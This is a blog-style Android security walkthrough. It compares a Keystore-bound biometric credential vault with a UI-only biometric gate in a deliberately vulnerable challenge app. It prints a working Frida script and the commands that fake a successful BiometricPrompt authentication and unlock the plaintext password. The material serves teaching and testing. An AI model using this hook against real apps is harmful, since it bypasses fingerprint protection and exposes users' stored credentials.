---
title: "Biometrics in Android Apps: What Could Possibly Go Wrong and How Attackers Exploit It."
date: 2026-03-27 14:10:00 +0800
categories: [Android]
tags: [Biometric Bypass, Frida Hooking,Android App Security, App Security, Reverse Engineering]
---

## The App: A Tale of Two Implementations

The app we are looking at is called **biometric (com.example.biometric)**. It lets a user enroll with a username and password, then log in using their fingerprint. Simple enough.

> The APK and source are available at [github.com/patali09/Frida-Challenges/tree/main/Biometric](https://github.com/patali09/Frida-Challenges/tree/main/Biometric)

But here is the twist - it has **two modes**:

| Mode | What It Does |
|------|-------------|
| **Secure Mode** | Credentials are stored in a biometric-protected encrypted vault. Your fingerprint is the key to the vault. |
| **Bypassable Mode** | Biometric is checked, but credentials are stored as plaintext. The fingerprint is just a door handle, not a lock. |

The entire point of the app is to show developers the difference. Let us break down both.

---

## First, Understand How Android Biometrics Actually Work

Before we attack anything, let us understand the building blocks.

Android has a hardware-backed security chip called the **Keystore**. Think of it as a vault inside your phone's processor. Keys stored there never leave the chip - apps can use them but can never extract them.

Biometric authentication in Android can be wired to this Keystore. You can tell Android: *"Create a cryptographic key, but only allow it to be used after the user scans their fingerprint."*

This is called **biometric-bound key usage**.

The critical question every developer should ask is:

> **Is my biometric check actually protecting the data, or is it just a UI gate?**

A UI gate means: biometric is checked, then the app does something. The data itself is not tied to the biometric.

A real cryptographic binding means: the biometric unlocks a key, and that key is what decrypts the data. No fingerprint = no key = no data.

The app we are looking at shows both patterns side by side.

---

## The Secure Implementation

### The Code

```dart
// lib/services/secure_auth_service.dart

// During enrollment:
final passwordHash = sha256.convert(utf8.encode(password)).toString();
await _storage.savePasswordHash(passwordHash);

// Store credentials inside a biometric-protected vault
final biometricStorage = await BiometricStorage().getStorage(
  'secure_credentials',
  options: StorageFileInitOptions(authenticationRequired: true),
);
await biometricStorage.write('{"username":"$username","password":"$password"}');
```

```dart
// During biometric login:
final didAuthenticate = await _localAuth.authenticate(
  localizedReason: 'Authenticate to access your credentials',
  options: const AuthenticationOptions(
    biometricOnly: true,
    stickyAuth: false,
  ),
);

if (didAuthenticate) {
  final stored = await biometricStorage.read(); // Only works if biometric passed
  // parse and return credentials
}
```

### What Is Happening Here

1. When you enroll, your credentials are written into a storage vault that is **marked as requiring biometric authentication**.
2. That vault is encrypted using a key that lives in the Android Keystore.
3. The Keystore will only release that key to decrypt the vault after the biometric check succeeds.
4. If you try to read from that vault without authenticating, Android says no.

The biometric is not just a check at the app level. The biometric is the gate to the decryption key at the OS level.

### What an Attacker Sees

If I am on a pentest and I pull the app's data directory:

```
/data/data/com.example.biometric_auth/shared_prefs/
/data/data/com.example.biometric_auth/files/
```

I will find the encrypted vault file. It is a blob of encrypted bytes. Without the Keystore key, and without a valid fingerprint to unlock that Keystore key, I cannot read it.

Even with root access, the key itself never leaves the secure hardware. I can dump the encrypted blob all day long - it buys me nothing.

**Attacker verdict: This is hard. The biometric check has real cryptographic meaning here.**

---

## The Insecure (Bypassable) Implementation

### The Code

```dart
// lib/services/insecure_auth_service.dart

// During enrollment:
await _storage.saveUsername(username);
await _storage.savePassword(password);  // <-- plaintext password stored here
```

```dart
// During biometric login:
final didAuthenticate = await _localAuth.authenticate(
  localizedReason: 'Authenticate to login',
  options: const AuthenticationOptions(biometricOnly: true),
);

if (didAuthenticate) {
  final username = await _storage.getUsername();
  final password = await _storage.getPassword();  // <-- just reads it back
  return AuthResult(username: username!, password: password!);
}
```

### What Is Happening Here

1. During enrollment, the password is saved to `FlutterSecureStorage` as plaintext.
2. During login, the app checks biometrics - and if that passes, it just reads the stored password back out.

The biometric here is a **UI gate only**. The password is sitting in encrypted storage, yes, but:

- The encryption key for that storage is managed by the Android Keystore under the app's own UID.
- The biometric is never involved in unlocking that key.
- The app can read the password at any time - the biometric only controls whether the *app logic* proceeds.

### The Attack

`FlutterSecureStorage` on Android uses `EncryptedSharedPreferences`, which is backed by the Android Keystore. That sounds secure, right?

Here is the problem: the key protecting the `EncryptedSharedPreferences` is accessible to any process running as that app's UID. It is not biometric-bound.

---

**Attack scenario - Runtime Hook with Frida (Android 16, Frida 17.6.2):**

Since the biometric in the bypassable mode is just an app-level check, we hook Android's `BiometricPrompt` at the hardware API layer and force it to report success without any fingerprint.

Here is the actual script used against this app, tested on **Android 16 (API 36)** with **Frida 17.6.2**:

```javascript
// script.js
// Tested: Android 16 (API 36) + Frida 17.6.2
// Source: https://codeshare.frida.re/@patali09/android-biometric-bypass---frida-17--android-16-

Java.perform(function() {
    try {
        var BiometricPrompt = Java.use('android.hardware.biometrics.BiometricPrompt');
        var authenticateMethod = BiometricPrompt.authenticate.overload(
            'android.os.CancellationSignal',
            'java.util.concurrent.Executor',
            'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback'
        );

        authenticateMethod.implementation = function(cancellationSignal, executor, callback) {
            var CryptoObject = Java.use('android.hardware.biometrics.BiometricPrompt$CryptoObject');
            var cryptoInstance = CryptoObject.$new(null);
            var ResultClass = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationResult');
            var resultInstance = ResultClass.$new(cryptoInstance, 2);
            callback.onAuthenticationSucceeded(resultInstance);
        };
    } catch (error) {
        console.log("BiometricPrompt not found or hook failed: " + error);
    }
});
```

**To run it:**

```bash
# Attach to the running app process
frida -U -n com.example.biometric_auth -l script.js

# Or spawn it fresh
frida -U -f com.example.biometric_auth -l script.js
```

**What this script actually does, line by line:**

1. `Java.use('android.hardware.biometrics.BiometricPrompt')` - hooks the low-level Android hardware API, not the Jetpack `androidx.biometric` wrapper. This is important on Android 16 because Flutter's `local_auth` plugin ultimately calls down to this layer.

2. `authenticateMethod.implementation = function(...)` - replaces the real `authenticate()` method with our own version. The real method would show the fingerprint dialog. Ours skips that entirely.

3. `CryptoObject.$new(null)` - creates a fake CryptoObject with no real cipher attached. In a proper crypto-bound implementation this would hold a real `Cipher` instance linked to a Keystore key. Here we pass null because the bypassable mode never uses a CryptoObject - it has nothing to unlock.

4. `ResultClass.$new(cryptoInstance, 2)` - constructs a fake `AuthenticationResult`. The `2` is the authentication type constant for `BIOMETRIC_STRONG`. We are telling the app: *"Strong biometric succeeded."*

5. `callback.onAuthenticationSucceeded(resultInstance)` - calls the success callback directly. The app's auth flow receives a success result as if the user had genuinely placed their finger on the sensor.

The app then reads the plaintext password from storage and hands it straight back.

**Why does this work on bypassable mode but not on secure mode?**

In the **bypassable mode**, after `onAuthenticationSucceeded` fires, the app just calls `_storage.getPassword()`. That storage operation has nothing to do with biometrics - it reads from `FlutterSecureStorage` which is always accessible to the app process. The fake success is enough.

In the **secure mode**, after `onAuthenticationSucceeded` fires, the app tries to read from `BiometricStorage`. That read operation requires the Keystore to release the decryption key. The Keystore checks whether a *real* biometric authentication actually happened using hardware attestation - not just whether a callback was called. Our fake `CryptoObject` with `null` cipher has no Keystore key behind it, so the Keystore rejects the read. The data stays encrypted.

This is the core difference. **One mode the biometric lives in app logic. The other mode the biometric lives in hardware.**
